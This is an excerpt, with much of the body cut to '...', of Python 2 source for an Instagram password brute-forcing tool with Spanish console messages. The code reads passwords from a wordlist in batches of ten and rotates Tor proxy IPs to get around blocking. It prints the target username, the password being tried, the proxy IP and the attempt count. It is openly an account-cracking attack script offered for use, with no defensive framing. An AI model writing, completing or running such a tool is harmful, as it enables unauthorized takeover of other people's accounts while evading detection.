...
class Instagram(TorManager,Browser):
 def __init__(self,username,wordlist):
  ...
  self.passlist = [] # temporary storage; holds a max of 10 passwords
 ...
 def setupPasswords(self):
  with open(self.wordlist,'r') as passwords:
   for pwd in passwords:
    pwd = pwd.replace('\n','')
    if len(self.passlist) < 10: # Modificar segun cantidad del diccionario
 ...
 def connectionHandler(self):
  if self.wait:return
  self.wait = True
  print '  [-] Esperando por conexion {}...{}'.format(self.g,self.n)
 ...
 def display(self,pwd=None):
  ...
  print ''
  print '  +------ Instagram ------+'
  print '  [-] Usuario : {}{}{}'.format(creds,self.username.title(),self.n)
  print '  [-] Password: {}{}{}'.format(creds,pwd,self.n)
  print '  [-] Proxy IP: {}{}{}'.format(self.b,ip,self.n)
  print '  [-] Intentos: {}{}{}'.format(self.y,attempts,self.n)
  print ''

  if not ip:
   print '  [-] Obteniendo Proxy IP {}...{}'.format(self.g,self.n)
   self.changeIp()
   time.sleep(1.3)
   self.display()
...
def main():
 ...
 if not os.path.exists('/usr/sbin/tor'):
  ...
  except KeyboardInterrupt:engine.kill('Saliendo {}...{}'.format(self.g,self.n))
  if not os.path.exists('/usr/sbin/tor'):
   engine.kill('Por Favor Instalar Tor'.format(engine.y,engine.r,engine.n))
 ...
 try:
  ...
  if not engine.isFound:
   engine.kill('Saliendo {}...{}'.format(engine.g,engine.n))
